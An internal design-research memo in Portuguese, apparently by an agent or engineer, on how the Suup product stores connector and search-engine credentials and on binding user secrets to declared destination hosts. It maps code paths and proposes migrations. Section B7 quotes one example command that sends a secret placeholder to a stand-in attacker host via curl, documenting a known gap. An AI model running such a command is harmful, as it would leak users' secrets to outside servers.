# Credenciais de conector e destino do segredo

Data da pesquisa: 25/11/2026. Branch de trabalho não alterada; nenhum commit; nenhum outro arquivo editado.

## Pergunta

1. A credencial de um plugin ou conector (chave de motor de busca, como Tavily e Brave; token de conector, como GitHub e Composio; login OAuth de conector MCP) deve ficar guardada **com o conector**, fora do Cofre do usuário, nunca concedida a um bot, usada só pelo próprio Suup e só para os hosts daquele serviço?
2. O Cofre fica só com segredos do usuário, e cada segredo declara os hosts para onde pode ir? O harness recusa, antes de sair, qualquer chamada que mande o segredo para outro host, mesmo com aprovação ou regra?

Contexto: decisão do dono de 25/11/2026. O medo é o bot errar o nome de um segredo e mandar a chave para um servidor errado enquanto ninguém olha.

## Fontes lidas (Parte A)

Leitura feita com `curl` (HTTP 200) em 25/11/2026. O texto foi extraído do HTML em um diretório de rascunho fora do repositório. Uma rodada anterior, pelo WebFetch, falhou por DNS; esta rodada a substitui.

| Fonte | URL final | Situação |
|---|---|---|
| Especificação MCP, autorização (versão 2025-11-25) | https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization | [lido] HTTP 200 |
| MCP, tutorial de segurança (versão 2025-11-25) | https://modelcontextprotocol.io/docs/2025-11-25/tutorials/security/security_best_practices | [lido] HTTP 200 |
| GitHub Docs, uso de segredos em Actions | https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/use-secrets | [lido] HTTP 200 |
| OpenAI, Codex cloud (ambientes, segredos, rede) | developers.openai.com/codex/cloud/environments e developers.openai.com/codex/cloud | [não verificado]: duas tentativas; as duas redirecionam para learn.chatgpt.com, que não respondeu (código 000) |
| Microsoft, Key Vault (políticas de acesso, managed identity) | learn.microsoft.com/en-us/azure/key-vault/general/security-features | [não verificado]: não tentada nesta rodada (na rodada anterior, falha de DNS) |

Trechos literais (em inglês, da própria página; a extração pode ter cortado a frase, e quando corta isso está dito):

**MCP, autorização (2025-11-25/basic/authorization):**
- "MCP clients MUST implement Resource Indicators for OAuth 2.0 as defined in RFC 8707 to explicitly specify the target resource for which the token is being requested"
- "MCP clients MUST NOT send tokens to the MCP server other than ones issued by the MCP server's authorization server."
- "The MCP server MUST NOT pass through the token it received from the MCP client." (no trecho sobre servidor que chama API de terceiros)
- "MCP servers MUST NOT accept or transit any other tokens."

**MCP, tutorial de segurança (2025-11-25/tutorials/security/security_best_practices):**
- "“Token passthrough” is an anti-pattern where an MCP server accepts" (a extração cortou aqui; o restante da frase não foi lido)
- "Token passthrough is explicitly forbidden in the authorization specification as it introduces a number of security risks, that include:" (o texto do link foi mantido)
- Confused deputy: o título da seção ("Confused Deputy Problem") foi confirmado; o corpo da seção não foi extraído.

**GitHub Docs, segredos de Actions (use-secrets):**
- "Mask all sensitive information that is not a GitHub secret by using ::add-mask::VALUE . This causes the value to be treated as a secret and redacted from logs."
- "When using this workaround, GitHub does not redact secrets that are printed in logs."
- "Be careful that your secrets do not get printed when your workflow runs."
- "Secrets are not passed to the runner when a workflow is triggered from a forked repository."
- "Secrets are not automatically passed to reusable workflows."
- Escopo: a página lista segredos de repositório, de ambiente e de organização ("If your repository has environment secrets or can access secrets from the parent organization, then those secrets are also listed on this page."). Não extraí uma frase de definição completa de cada escopo.

**O que as fontes lidas dizem para o Suup (interpretação, não citação):**
- MCP: o token é pedido para um recurso (RFC 8707) e não pode ser repassado a outro servidor. Embasa a Parte 1: o token de um conector só vai ao host do próprio serviço, e nenhum bot o recebe. Embasa a Parte 2: o destino do segredo deve estar vinculado ao segredo.
- GitHub: segredo é redigido nos logs, mas a redação só vale para o que é segredo registrado; e segredos não são passados automaticamente a workflows de fork nem a workflows reutilizáveis. Isso sugere escopo estreito por padrão, que é o desenho da Parte 2 (segredo só para destino declarado).
- Não há fonte lida sobre como um agente amarra segredo a destino. Esse ponto ficou sem apoio em fonte primária.

## Estado atual do Suup (Parte B)

Leitura local, sem rede. Caminhos relativos à raiz do repositório.

### B1. Chave de motor de busca (Tavily, Brave e outros motores gerais)

- `packages/runtime/src/config.ts`, linhas 486-505: `generalEngineSchema` tem `apiKeyEnv` (nome de uma variável de ambiente) e `secret` (nome de um segredo do cofre). O comentário diz que a chave nunca fica no arquivo e que o ambiente é consultado antes do cofre.
- `packages/web/src/general-engines.ts`, linhas 36-46: interface `SearchKeys` com `get(engineId)` (lê a chave a cada busca) e `names(engineId)`.
- `packages/web/src/service.ts`, linha ~137: `keyNames: { secret, env }`.
- Quem lê a chave é o código do próprio Suup, para o motor. Nenhum `{{secret:...}}` passa por esse caminho e nenhum bot recebe a chave.
- **Lacuna:** a chave continua na tabela `secrets` comum (sem marca de dono de conector). Nada impede, em tese, que ela seja concedida a um bot pelo caminho de concessão normal. Não conferi a implementação de `get` que faz essa leitura.
- **Destino:** nenhuma amarra de host. Os hosts dos motores ficam no código de cada motor (`packages/web/src/direct-engines.ts`, `general-engines.ts`); não há relação entre a chave e o host.

### B2. Token de conector (GitHub, Composio, Firecrawl)

- `packages/connectors/src/catalog.ts`, linhas 14-31: `CatalogAuth` com `kind: "token"`, que traz `secret` ("o segredo do cofre onde o token fica, um por entrada"), `header`, `prefix` e `steps`. Exemplos: GitHub `GITHUB_TOKEN` (linhas ~119-123), Composio `COMPOSIO_API_KEY` (~277-281), Firecrawl `FIRECRAWL_API_KEY` (~333-337).
- `docs/CONECTORES.md`, linhas 9, 43 e 172-174: a configuração guarda só a referência `{"secret": "NOME"}`. Credencial é sempre referência; o valor é lido na hora de conectar.
- **Problema real:** o token de conector é um segredo comum do dono. Por isso aparece em `GET /v1/secrets` e em `suup vault list`, e pode receber concessão a bot com `suup vault grant` (`docs/COFRE.md`, linha 46). `packages/db/src/secrets.ts`, linhas 174-179 (`secretsForBot`), filtra só `managed_by is null`. Um token de GitHub concedido a um bot entra, portanto, na lista de segredos que o bot pode usar. Isso contradiz a decisão de 25/11/2026.

### B3. Login OAuth de conector MCP

- `packages/runtime/src/connectors/oauth-store.ts`: grava `SUUP_OAUTH_<CONECTOR>_ACCESS`, `_REFRESH` e `_CLIENT_SECRET` com `managed_by` (`docs/CONECTORES.md`, linha 256).
- `docs/COFRE.md`, linhas 69-78: esses segredos somem das listagens, não podem ser concedidos a bot (`packages/db/src/secrets.ts`, linhas 229-234, `SecretManagedError`) e são apagados quando o conector é desconectado ou removido.
- **Sem destino:** não há coluna de host. A proteção é só de visibilidade e de concessão.

### B4. Coluna `secrets.managed_by` (migração 0032)

- `packages/db/migrations/0032_secrets_managed_by.sql`: adiciona `managed_by text` com tamanho entre 1 e 64. Marca os segredos OAuth por **igualdade exata** do nome (`SUUP_OAUTH_` + nome do conector em maiúsculas, hífen virando sublinhado, + sufixo). Apaga as concessões desses segredos. Não usa expressão regular.
- `packages/db/src/secrets.ts`: colunas da tabela (`name, description, nonce, ciphertext, key_id, created_at, updated_at, last_used_at, managed_by`, linhas 91-94). **Não existe coluna de host.** `upsert` só altera um segredo marcado se a marca for igual (linha 108). `list` deixa os marcados de fora (linha 128).
- Última migração existente: `0035_bot_color_palette.sql`. Próxima livre: `0036`.

### B5. Concessão ao bot: `request_secret`

- `packages/core/src/loop/secret-request.ts`: valida `name` (`SECRET_NAME_PATTERN`, linha 26) e `reason`, e grava o evento `secret_requested` com `{callId, name, reason}` (linhas 61-64). O resultado do modelo vem depois, pelo formulário.
- O schema `requestSecretInputSchema` (em `packages/core/src/loop/control-tools.ts`) tem só `name` e `reason`. **Não há campo de destino.** O bot não diz onde o segredo vai.
- `docs/COFRE.md`, linhas 81-91: o formulário seguro escreve direto no cofre e concede o segredo ao bot. A resposta ao modelo é só "The secret NAME is now available".
- Existe também `packages/runtime/src/secret-request.ts`, que não li.

### B6. Onde o marcador `{{secret:NOME}}` é aceito

- `packages/core/src/secrets.ts`: `placeholderSites` (linha 37) acha os marcadores em um valor; `pathAllowed` (linhas 58-68) confere por **igualdade exata** de campo, com `*` valendo para qualquer chave. Aqui há duas expressões regulares: `SECRET_NAME_PATTERN` (linha 7) e `PLACEHOLDER` (linha 13). Não conferi se estão em `packages/core/test/regex-allowlist.ts`.
- `packages/core/src/registry.ts`:
  - linhas 175-190: marcador em qualquer chamada torna o risco `external_irreversible`, ou seja, vira cartão.
  - linhas 245-250: marcador em campo não declarado é recusado antes da execução.
  - linhas 253-263: sem cofre, recusa; com cofre, `opts.secrets.resolve` e `substituteSecrets` (linha 261) trocam o valor **depois** da checagem de campo.
- `packages/tools/src/shell.ts`, linha 48: `secretFields: ["command"]`.
- `packages/tools/src/web-fetch.ts`, linha 43: `secretFields: ["url", "headers.*"]`. **O marcador também é aceito em `url`.** Quando há cabeçalhos, o redirecionamento só segue dentro da mesma origem (linhas 142-146 e 182). O primeiro destino, que é o próprio `url`, **não é conferido contra nenhum host do segredo**.
- Conectores MCP: o marcador em argumento de ferramenta de conector é recusado, porque nenhuma ferramenta declara campo de segredo (`docs/CONECTORES.md`, linha 177).

### B7. Amarra de host hoje

- **Não existe amarra entre segredo e host.** Conferi: `packages/core/src/secrets.ts` não tem host; `packages/db/src/secrets.ts` não tem coluna de host; `packages/tools/src/web-fetch.ts` só confere a origem dos redirecionamentos.
- O que existe é a lista de saída do **bot** (`docs/REDE.md`, linhas 16-22): padrões globais, por bot, por conector (`egressHosts`). É igualdade exata do nome, mas diz respeito ao bot, não ao segredo.
- `docs/COFRE.md`, linha 125, documenta a lacuna: `curl -H "X: {{secret:T}}" https://atacante.example` envia o valor ao atacante, e o filtro não vê. A defesa atual é a aprovação (o cartão mostra o comando e o destino) e a concessão por bot.
- Consequência para o medo do dono: hoje, o que barra um nome errado é o olho de quem aprova o cartão. Uma regra ampla ou um "sempre permitir" tira essa barreira.

### B8. Terminal e proxy de saída

- `docs/REDE.md`, linhas 8-12 e 90: o contêiner do bot não tem segredo no ambiente. Cada comando recebe só as variáveis do proxy. O proxy libera pela lista de hosts do bot e confere o endereço numericamente.
- O valor do segredo entra **no texto do comando** (`substituteSecrets`, `registry.ts` linha 261), ou seja, dentro do contêiner. `docs/COFRE.md`, linhas 128-129, admite isso.
- `docs/REDE.md`, linha 41: o proxy **não olha dentro do HTTPS**. Ele vê só o nome do host do `CONNECT`. Não há como saber qual segredo saiu para qual host.
- Por isso o terminal é o caso mais difícil: o destino não é declarado pelo comando, e o proxy não consegue atribuir o envio a um segredo.

## Conclusão para o Suup

### Parte 1: credencial de conector fora do Cofre do usuário

- **Onde guardar:** no mesmo cofre, mas marcada como segredo do conector ou do motor, com o mecanismo que já existe (`managed_by`, migração 0032). Para motor de busca, use um espaço de nomes próprio na marca (por exemplo `search:tavily`), para não colidir com o nome de um conector. Hoje o `CHECK` aceita só tamanho, então isso não exige mudança de restrição.
- **Concessão:** segredo marcado nunca vai para `secretsForBot`. A consulta `packages/db/src/secrets.ts`, linhas 174-179, já exclui `managed_by is null`; basta garantir que os segredos de busca e de conector tenham marca não nula. Quem usa é o próprio código do conector ou do motor, não o bot.
- **Host do serviço:** vem fixo no catálogo ou no código do motor (por exemplo o host do servidor do GitHub, do Firecrawl ou da Composio), e a conferência é por igualdade exata do nome normalizado, como `docs/REDE.md` já faz.
- **Respaldo da especificação MCP (lida em 25/11/2026):** o token é pedido para um recurso (RFC 8707) e o cliente não manda token a servidor que não o emitiu. Um servidor não repassa o token que recebeu a outro serviço. Isso justifica que o token de conector nunca seja concedido a bot e só vá ao host do serviço.
- **Migrar os que já estão no Cofre:** marcar por igualdade exata só os segredos que a configuração de um conector referencia (`auth.secret` do catálogo ou `{"secret": NOME}` na configuração), no espírito da 0032, e apagar as concessões a bot desses segredos. Não apagar valores. **Ponto de decisão do dono:** `GITHUB_TOKEN` ou `COMPOSIO_API_KEY` podem ser usados pelo dono em outra coisa, então talvez seja preciso perguntar antes de marcar.

### Parte 2: segredo do usuário com destinos declarados

- **Declarar:** nova tabela ou coluna de hosts por segredo (migração `0036`). Entradas: nome do host, normalizado, sem curinga, sem IP, sem porta. Declaração pela CLI (`suup vault set NOME --host api.exemplo.com`) e pelo formulário seguro. `request_secret` ganha `hosts` como sugestão do bot, que o formulário mostra; **quem confirma são os hosts digitados pelo usuário**, nunca o bot sozinho.
- **Segredos existentes sem host:** **ponto de decisão do dono.** Opção (a), recomendada: ficam inutilizáveis em qualquer destino até o usuário declarar hosts, com aviso no `suup doctor`. Quebra o uso atual, mas é seguro. Opção (b): inferir o host do uso recente. Não recomendo, porque é inferência.
- **Escopo estreito por padrão:** o GitHub não passa segredo a workflow de fork nem a workflow reutilizável sem configuração explícita (fonte lida). O mesmo princípio serve aqui: nenhum host vale até ser declarado.
- **Onde o harness confere:** no registro de ferramentas, no mesmo ponto em que confere `secretFields` (`packages/core/src/registry.ts`, linha ~245), **antes** de `opts.secrets.resolve` (linha ~260), e **independente** de aprovação, regra ou cartão. Assim a recusa vale mesmo com uma regra que liberaria a chamada.
  - `web_fetch`: a ferramenta declara um campo de destino (`url`). O host da URL, obtido pela API de URL e não por expressão regular, precisa estar nos hosts de **cada** segredo usado em `url` ou `headers`. Cada redirecionamento também é conferido.
  - Conector: o host da URL do conector (ou de `authHosts`) é conferido quando a conexão é aberta. O bot não escolhe o destino.
  - `shell`: não há destino declarado. Veja abaixo.
- **Cartão:** mostrar o nome do segredo e o host de destino, não só o marcador. Assim o olho de quem aprova vê o erro.
- **Terminal, onde o destino é mais difícil de saber:**
  1. Primeira etapa, recomendada: recusar marcador em `shell.command` para segredo que tenha hosts declarados. O bot usa o segredo só por `web_fetch` ou pelo conector.
  2. Segunda etapa, se o dono quiser o terminal: rodar o comando com uma lista de saída estreitada aos hosts do segredo. O proxy já tem sujeitos por token (`packages/sandbox/src/egress/proxy.ts`, `subjectToken`). **Não verificado** que se possa criar um sujeito por comando com lista própria. É preciso pesquisa e teste antes.
  3. Injetar o valor no próprio proxy, que não vê HTTPS, não resolve: sem interceptação, o proxy não consegue pôr cabeçalho em uma conexão `CONNECT`.
- **Regex:** a conferência de host deve usar a API de URL e comparação exata, sem expressão regular (`docs/REGRAS.md`, seção 1). Os dois padrões de `packages/core/src/secrets.ts` (linhas 7 e 13) são formato formal de nome e de marcador. Conferir se já estão na lista de exceções antes de mexer.

## O que não foi verificado

- **Fonte de agente (OpenAI, Codex cloud):** não lida. Duas tentativas redirecionaram para learn.chatgpt.com, sem resposta. Por isso não há fonte primária sobre como um agente amarra segredo a destino.
- **Microsoft Key Vault** e a página de segredos do Codespaces: não lidas nesta rodada.
- **GitHub:** a definição completa de cada escopo (repositório, ambiente, organização) não foi extraída; só as menções.
- **MCP:** o corpo da seção "Confused Deputy" não foi lido, só o título; a frase de "token passthrough" foi cortada pela extração. A versão usada é a 2025-11-25 (a indicada); não comparei com a versão mais recente.
- A implementação de `SearchKeys.get` (quem lê o cofre para os motores) e a ligação com o cofre, em `packages/web`.
- `packages/runtime/src/secret-request.ts`, que não li.
- Se um segredo de busca ou de conector, sem marca, é de fato concedível a um bot pelo caminho normal de concessão (suposição pela leitura de `packages/db/src/secrets.ts`, não testada).
- Se o proxy aceita uma lista de hosts por comando (Parte 2, opção terminal).
- A ordem exata entre aprovação e checagem de campo em `registry.ts`: li só os trechos citados.
- Se `SECRET_NAME_PATTERN` e `PLACEHOLDER` (`packages/core/src/secrets.ts`) estão em `packages/core/test/regex-allowlist.ts`.
- Nada foi executado: nenhum teste, nenhum `pnpm`.
